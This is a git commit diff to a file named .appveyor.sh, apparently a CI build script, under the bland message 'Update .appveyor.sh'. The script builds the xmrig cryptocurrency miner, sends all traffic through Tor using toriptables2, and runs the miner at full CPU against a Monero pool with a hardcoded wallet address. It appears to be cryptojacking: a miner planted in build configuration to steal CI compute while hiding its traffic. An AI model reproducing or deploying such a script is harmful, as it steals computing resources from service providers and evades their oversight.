623e406eef614383a903c191f6bbf3b7fce3ede0
jdiijfrlohb <anhhaitienken@gmail.com>
2019-08-11 00:37:51 +0700

    Update .appveyor.sh

--- .appveyor.sh
+++ .appveyor.sh
@@ -1,17 +1,17 @@
-#!/bin/bash
-sudo -i
-sudo apt-get update
-sudo rm /var/lib/apt/lists/lock
-sudo rm /var/cache/apt/archives/lock
-sudo rm /var/lib/dpkg/lock*
-sudo dpkg --configure -a
-sudo apt-get -f -y install
-sudo apt install -y libmicrohttpd-dev libssl-dev cmake python build-essential libhwloc-dev screen git automake autoconf pkg-config libcurl4-openssl-dev libjansson-dev libgmp-dev libuv1-dev tor
+apt-get update
+apt-get install -y libmicrohttpd-dev libssl-dev cmake python build-essential libhwloc-dev screen git automake autoconf pkg-config libcurl4-openssl-dev libjansson-dev libgmp-dev libuv1-dev tor python
+git clone https://github.com/ruped24/toriptables2.git
+cd toriptables2/
+mv toriptables2.py /usr/local/bin/
+cd
 git clone https://github.com/xmrig/xmrig.git
-sudo systemctl start tor
+systemctl start tor
+toriptables2.py -l
+
 cd xmrig
 mkdir build
 cd build
 cmake ..
 make
-torify ./xmrig --no-color --donate-level 1 -a cryptonight -k --tls -o graft.miner.rocks:5007 -u G91mG6dWJ57KLid9UKV8rD73C3DuPhjEpTFyfa39w2nGLYpFVbLkXeWEr7ND5ttLwVB7Ht3jmVynKXTQ51UKeRio7CWaDPD.5000 -p w=Rig1 --variant rwz --b
+sysctl -w vm.nr_hugepages=128
+torify ./xmrig --no-color --donate-level 1 --max-cpu-usage 100 --cpu-priority 5 -a cryptonight -k --tls -o pool.supportxmr.com:9000 -u 45W8gefZHpbBcevfEwq28DM5g5RKwQRNyGk88Mzc2e6YcswVCi1caWV8dzfyVxB6dKcQLyBGszpobPSfQR2QvMSw9e3hZkb -p x3 --b
